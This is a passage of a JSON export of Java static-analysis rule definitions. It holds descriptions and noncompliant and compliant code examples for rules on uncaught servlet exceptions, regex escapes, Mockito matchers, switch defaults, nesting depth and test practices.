            "mdDesc": "<p>Even though the signatures for methods in a servlet include <code>throws IOException, ServletException</code>, it's a bad idea to let such\nexceptions be thrown. Failure to catch exceptions in a servlet could leave a system in a vulnerable state, possibly resulting in denial-of-service\nattacks, or the exposure of sensitive information because when a servlet throws an exception, the servlet container typically sends debugging\ninformation back to the user. And that information could be very valuable to an attacker. </p>\n<p>This rule checks all exceptions in methods named \"do*\" are explicitly handled in servlet classes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws IOException, ServletException {\n  String ip = request.getRemoteAddr();\n  InetAddress addr = InetAddress.getByName(ip); // Noncompliant; getByName(String) throws UnknownHostException\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws IOException, ServletException {\n  try {\n    String ip = request.getRemoteAddr();\n    InetAddress addr = InetAddress.getByName(ip);\n    //...\n  }\n  catch (UnknownHostException uhex) {\n    //...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/600.html\">MITRE, CWE-600</a> - Uncaught Exception in Servlet </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/-zZGBQ\">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "error-handling",
                "owasp-a3"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S2718",
            "repo": "java",
            "name": "\"DateUtils.truncate\" from Apache Commons Lang library should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of the <code>ZonedDateTime</code> class introduced in Java 8 to truncate a date can be significantly faster than the <code>DateUtils</code>\nclass from Commons Lang.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic Date trunc(Date date) {\n  return DateUtils.truncate(date, Calendar.SECOND);  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic Date trunc(Date date) {\n  Instant instant = date.toInstant();\n  ZonedDateTime zonedDateTime = instant.atZone(ZoneId.systemDefault());\n  ZonedDateTime truncatedZonedDateTime = zonedDateTime.truncatedTo(ChronoUnit.SECONDS);\n  Instant truncatedInstant = truncatedZonedDateTime.toInstant();\n  return Date.from(truncatedInstant);\n}\n</pre>",
            "mdDesc": "<p>The use of the <code>ZonedDateTime</code> class introduced in Java 8 to truncate a date can be significantly faster than the <code>DateUtils</code>\nclass from Commons Lang.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic Date trunc(Date date) {\n  return DateUtils.truncate(date, Calendar.SECOND);  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic Date trunc(Date date) {\n  Instant instant = date.toInstant();\n  ZonedDateTime zonedDateTime = instant.atZone(ZoneId.systemDefault());\n  ZonedDateTime truncatedZonedDateTime = zonedDateTime.truncatedTo(ChronoUnit.SECONDS);\n  Instant truncatedInstant = truncatedZonedDateTime.toInstant();\n  return Date.from(truncatedInstant);\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8",
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3923",
            "repo": "java",
            "name": "All branches in a conditional structure should not have exactly the same implementation",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made\nand something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (b == 0) {  // Noncompliant\n  doOneMoreThing();\n} else {\n  doOneMoreThing();\n}\n\nint b = a &gt; 12 ? 4 : 4;  // Noncompliant\n\nswitch (i) {  // Noncompliant\n  case 1:\n    doSomething();\n    break;\n  case 2:\n    doSomething();\n    break;\n  case 3:\n    doSomething();\n    break;\n  default:\n    doSomething();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>\nclauses.</p>\n<pre>\nif(b == 0) {    //no issue, this could have been done on purpose to make the code more readable\n  doSomething();\n} else if(b == 1) {\n  doSomething();\n}\n</pre>",
            "mdDesc": "<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made\nand something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (b == 0) {  // Noncompliant\n  doOneMoreThing();\n} else {\n  doOneMoreThing();\n}\n\nint b = a &gt; 12 ? 4 : 4;  // Noncompliant\n\nswitch (i) {  // Noncompliant\n  case 1:\n    doSomething();\n    break;\n  case 2:\n    doSomething();\n    break;\n  case 3:\n    doSomething();\n    break;\n  default:\n    doSomething();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>\nclauses.</p>\n<pre>\nif(b == 0) {    //no issue, this could have been done on purpose to make the code more readable\n  doSomething();\n} else if(b == 1) {\n  doSomething();\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S6070",
            "repo": "java",
            "name": "The regex escape sequence \\cX should only be used with characters in the @-_ range",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In regular expressions the escape sequence <code>\\cX</code>, where the X stands for any character that's either <code>@</code>, any capital ASCII\nletter, <code>[</code>, <code>\\</code>, <code>]</code>, <code>^</code> or <code>_</code>, represents the control character that \"corresponds\" to the\ncharacter following <code>\\c</code>, meaning the control character that comes 64 bytes before the given character in the ASCII encoding.</p>\n<p>In some other regex engines (for example in that of Perl) this escape sequence is case insensitive and <code>\\cd</code> produces the same control\ncharacter as <code>\\cD</code>. Further using <code>\\c</code> with a character that's neither <code>@</code>, any ASCII letter, <code>[</code>,\n<code>\\</code>, <code>]</code>, <code>^</code> nor <code>_</code>, will produce a warning or error in those engines. Neither of these things is true\nin Java, where the value of the character is always XORed with 64 without checking that this operation makes sense. Since this won't lead to a\nsensible result for characters that are outside of the <code>@</code> to <code>_</code> range, using <code>\\c</code> with such characters is almost\ncertainly a mistake.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"\\\\ca\"); // Noncompliant, 'a' is not an upper case letter\nPattern.compile(\"\\\\c!\"); // Noncompliant, '!' is outside of the '@'-'_' range\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"\\\\cA\"); // Compliant, this will match the \"start of heading\" control character\nPattern.compile(\"\\\\c^\"); // Compliant, this will match the \"record separator\" control character\n</pre>",
            "mdDesc": "<p>In regular expressions the escape sequence <code>\\cX</code>, where the X stands for any character that's either <code>@</code>, any capital ASCII\nletter, <code>[</code>, <code>\\</code>, <code>]</code>, <code>^</code> or <code>_</code>, represents the control character that \"corresponds\" to the\ncharacter following <code>\\c</code>, meaning the control character that comes 64 bytes before the given character in the ASCII encoding.</p>\n<p>In some other regex engines (for example in that of Perl) this escape sequence is case insensitive and <code>\\cd</code> produces the same control\ncharacter as <code>\\cD</code>. Further using <code>\\c</code> with a character that's neither <code>@</code>, any ASCII letter, <code>[</code>,\n<code>\\</code>, <code>]</code>, <code>^</code> nor <code>_</code>, will produce a warning or error in those engines. Neither of these things is true\nin Java, where the value of the character is always XORed with 64 without checking that this operation makes sense. Since this won't lead to a\nsensible result for characters that are outside of the <code>@</code> to <code>_</code> range, using <code>\\c</code> with such characters is almost\ncertainly a mistake.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"\\\\ca\"); // Noncompliant, 'a' is not an upper case letter\nPattern.compile(\"\\\\c!\"); // Noncompliant, '!' is outside of the '@'-'_' range\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"\\\\cA\"); // Compliant, this will match the \"start of heading\" control character\nPattern.compile(\"\\\\c^\"); // Compliant, this will match the \"record separator\" control character\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S6073",
            "repo": "java",
            "name": "Mockito argument matchers should be used on all parameters",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Mockito provides <em>argument matchers</em> and <em>argument captors</em> for flexibly stubbing or verifying method calls.</p>\n<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads\nwith and without argument matchers.</p>\n<p>However, if argument matchers or captors are used only on some of the parameters, all the parameters need to have matchers as well, otherwise an\n<code>InvalidUseOfMatchersException</code> will be thrown. </p>\n<p>This rule consequently raises an issue every time matchers are not used on all the parameters of a stubbed/verified method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(anyInt(), i1, i2)).willReturn(null); // Noncompliant\n  when(foo.baz(eq(val1), val2)).thenReturn(\"hi\"); // Noncompliant\n  doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), -1); // Noncompliant\n  verify(foo).bar(i1, anyInt(), i2); // Noncompliant\n  ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);\n  verify(foo).bar(captor.capture(), i1, any()); // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(anyInt(), eq(i1), eq(i2))).willReturn(null);\n  when(foo.baz(val1, val2)).thenReturn(\"hi\");\n  doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), eq(-1));\n  verify(foo).bar(eq(i1), anyInt(), eq(i2));\n  ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);\n  verify(foo).bar(captor.capture(), any(), any());\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers\">Mockito documentation</a> -\n  argument matchers </li>\n  <li> <a href='/coding_rules#rule_key=java%3AS6068'>S6068</a> - Call to Mockito method \"verify\", \"when\" or \"given\" should be simplified </li>\n</ul>",
            "mdDesc": "<p>Mockito provides <em>argument matchers</em> and <em>argument captors</em> for flexibly stubbing or verifying method calls.</p>\n<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads\nwith and without argument matchers.</p>\n<p>However, if argument matchers or captors are used only on some of the parameters, all the parameters need to have matchers as well, otherwise an\n<code>InvalidUseOfMatchersException</code> will be thrown. </p>\n<p>This rule consequently raises an issue every time matchers are not used on all the parameters of a stubbed/verified method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(anyInt(), i1, i2)).willReturn(null); // Noncompliant\n  when(foo.baz(eq(val1), val2)).thenReturn(\"hi\"); // Noncompliant\n  doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), -1); // Noncompliant\n  verify(foo).bar(i1, anyInt(), i2); // Noncompliant\n  ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);\n  verify(foo).bar(captor.capture(), i1, any()); // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(anyInt(), eq(i1), eq(i2))).willReturn(null);\n  when(foo.baz(val1, val2)).thenReturn(\"hi\");\n  doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), eq(-1));\n  verify(foo).bar(eq(i1), anyInt(), eq(i2));\n  ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);\n  verify(foo).bar(captor.capture(), any(), any());\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers\">Mockito documentation</a> -\n  argument matchers </li>\n  <li> {rule:java:S6068} - Call to Mockito method \"verify\", \"when\" or \"given\" should be simplified </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "mockito",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S131",
            "repo": "java",
            "name": "\"switch\" statements should have \"default\" clauses",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a\nsuitable comment as to why no action is taken.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (param) {  //missing default clause\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n\nswitch (param) {\n  default: // default clause should be the last one\n    error();\n    break;\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n  default:\n    error();\n    break;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>If the <code>switch</code> parameter is an <code>Enum</code> and if all the constants of this enum are used in the <code>case</code> statements,\nthen no <code>default</code> clause is expected.</p>\n<p>Example:</p>\n<pre>\npublic enum Day {\n    SUNDAY, MONDAY\n}\n...\nswitch(day) {\n  case SUNDAY:\n    doSomething();\n    break;\n  case MONDAY:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/478.html\">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/RtYxBQ\">CERT, MSC01-C.</a> - Strive for logical completeness </li>\n</ul>",
            "mdDesc": "<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a\nsuitable comment as to why no action is taken.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (param) {  //missing default clause\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n\nswitch (param) {\n  default: // default clause should be the last one\n    error();\n    break;\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n  default:\n    error();\n    break;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>If the <code>switch</code> parameter is an <code>Enum</code> and if all the constants of this enum are used in the <code>case</code> statements,\nthen no <code>default</code> clause is expected.</p>\n<p>Example:</p>\n<pre>\npublic enum Day {\n    SUNDAY, MONDAY\n}\n...\nswitch(day) {\n  case SUNDAY:\n    doSomething();\n    break;\n  case MONDAY:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/478.html\">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/RtYxBQ\">CERT, MSC01-C.</a> - Strive for logical completeness </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S134",
            "repo": "java",
            "name": "Control flow statements \"if\", \"for\", \"while\", \"switch\" and \"try\" should not be nested too deeply",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making\nwhat's known as \"Spaghetti code\".</p>\n<p>Such code is hard to read, refactor and therefore maintain.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 3:</p>\n<pre>\nif (condition1) {                  // Compliant - depth = 1\n  /* ... */\n  if (condition2) {                // Compliant - depth = 2\n    /* ... */\n    for(int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit\n      /* ... */\n      if (condition4) {            // Noncompliant - depth = 4\n        if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4\n          /* ... */\n        }\n        return;\n      }\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making\nwhat's known as \"Spaghetti code\".</p>\n<p>Such code is hard to read, refactor and therefore maintain.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 3:</p>\n<pre>\nif (condition1) {                  // Compliant - depth = 1\n  /* ... */\n  if (condition2) {                // Compliant - depth = 2\n    /* ... */\n    for(int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit\n      /* ... */\n      if (condition4) {            // Noncompliant - depth = 4\n        if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4\n          /* ... */\n        }\n        return;\n      }\n    }\n  }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum allowed control flow statement nesting depth.",
                    "defaultValue": "3",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2924",
            "repo": "java",
            "name": "JUnit rules should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test, several others do not, and\nthere's no reason to leave them cluttering up the file if they're not in use.</p>\n<p>This rule raises an issue when <code>Test</code> class fields of the following types aren't used by any of the test methods:\n<code>TemporaryFolder</code>, and <code>TestName</code>.</p>\n<p>This rule also applies to the JUnit 5 equivalent classes: <code>TempDir</code>, and <code>TestInfo</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ProjectDefinitionTest {\n\n  @Rule\n  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey(\"mykey\");\n    assertThat(def.getKey(), is(\"mykey\"));\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class ProjectDefinitionTest {\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey(\"mykey\");\n    assertThat(def.getKey(), is(\"mykey\"));\n  }\n}\n</pre>",
            "mdDesc": "<p>While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test, several others do not, and\nthere's no reason to leave them cluttering up the file if they're not in use.</p>\n<p>This rule raises an issue when <code>Test</code> class fields of the following types aren't used by any of the test methods:\n<code>TemporaryFolder</code>, and <code>TestName</code>.</p>\n<p>This rule also applies to the JUnit 5 equivalent classes: <code>TempDir</code>, and <code>TestInfo</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ProjectDefinitionTest {\n\n  @Rule\n  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey(\"mykey\");\n    assertThat(def.getKey(), is(\"mykey\"));\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class ProjectDefinitionTest {\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey(\"mykey\");\n    assertThat(def.getKey(), is(\"mykey\"));\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2925",
            "repo": "java",
            "name": "\"Thread.sleep\" should not be used in tests",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using <code>Thread.sleep</code> in a test is just generally a bad idea. It creates brittle tests that can fail unpredictably depending on\nenvironment (\"Passes on my machine!\") or load. Don't rely on timing (use mocks) or use libraries such as <code>Awaitility</code> for asynchroneous\ntesting. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testDoTheThing(){\n\n  MyClass myClass = new MyClass();\n  myClass.doTheThing();\n\n  Thread.sleep(500);  // Noncompliant\n  // assertions...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testDoTheThing(){\n\n  MyClass myClass = new MyClass();\n  myClass.doTheThing();\n\n  await().atMost(2, Duration.SECONDS).until(didTheThing());  // Compliant\n  // assertions...\n}\n\nprivate Callable&lt;Boolean&gt; didTheThing() {\n  return new Callable&lt;Boolean&gt;() {\n    public Boolean call() throws Exception {\n      // check the condition that must be fulfilled...\n    }\n  };\n}\n</pre>",
            "mdDesc": "<p>Using <code>Thread.sleep</code> in a test is just generally a bad idea. It creates brittle tests that can fail unpredictably depending on\nenvironment (\"Passes on my machine!\") or load. Don't rely on timing (use mocks) or use libraries such as <code>Awaitility</code> for asynchroneous\ntesting. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testDoTheThing(){\n\n  MyClass myClass = new MyClass();\n  myClass.doTheThing();\n\n  Thread.sleep(500);  // Noncompliant\n  // assertions...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testDoTheThing(){\n\n  MyClass myClass = new MyClass();\n  myClass.doTheThing();\n\n  await().atMost(2, Duration.SECONDS).until(didTheThing());  // Compliant\n  // assertions...\n}\n\nprivate Callable&lt;Boolean&gt; didTheThing() {\n  return new Callable&lt;Boolean&gt;() {\n    public Boolean call() throws Exception {\n      // check the condition that must be fulfilled...\n    }\n  };\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1711",
            "repo": "java",
            "name": "Standard functional interfaces should not be redefined",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Just as there is little justification for writing your own String class, there is no good reason to re-define one of the existing, standard\nfunctional interfaces.</p>\n<p>Doing so may seem tempting, since it would allow you to specify a little extra context with the name. But in the long run, it will be a source of\nconfusion, because maintenance programmers will wonder what is different between the custom functional interface and the standard one.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@FunctionalInterface\npublic interface MyInterface { // Noncompliant\n\tdouble toDouble(int a);\n}\n\n@FunctionalInterface\npublic interface ExtendedBooleanSupplier { // Noncompliant\n  boolean get();\n  default boolean isFalse() {\n    return !get();\n  }\n}\n\npublic class MyClass {\n    private int a;\n    public double myMethod(MyInterface instance){\n\treturn instance.toDouble(a);\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@FunctionalInterface\npublic interface ExtendedBooleanSupplier extends BooleanSupplier { // Compliant, extends java.util.function.BooleanSupplier\n  default boolean isFalse() {\n    return !getAsBoolean();\n  }\n}\n\npublic class MyClass {\n    private int a;\n    public double myMethod(IntToDoubleFunction instance){\n\treturn instance.applyAsDouble(a);\n    }\n}\n</pre>",
            "mdDesc": "<p>Just as there is little justification for writing your own String class, there is no good reason to re-define one of the existing, standard\nfunctional interfaces.</p>\n<p>Doing so may seem tempting, since it would allow you to specify a little extra context with the name. But in the long run, it will be a source of\nconfusion, because maintenance programmers will wonder what is different between the custom functional interface and the standard one.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@FunctionalInterface\npublic interface MyInterface { // Noncompliant\n\tdouble toDouble(int a);\n}\n\n@FunctionalInterface\npublic interface ExtendedBooleanSupplier { // Noncompliant\n  boolean get();\n  default boolean isFalse() {\n    return !get();\n  }\n}\n\npublic class MyClass {\n    private int a;\n    public double myMethod(MyInterface instance){\n\treturn instance.toDouble(a);\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@FunctionalInterface\npublic interface ExtendedBooleanSupplier extends BooleanSupplier { // Compliant, extends java.util.function.BooleanSupplier\n  default boolean isFalse() {\n    return !getAsBoolean();\n  }\n}\n\npublic class MyClass {\n    private int a;\n    public double myMethod(IntToDoubleFunction instance){\n\treturn instance.applyAsDouble(a);\n    }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
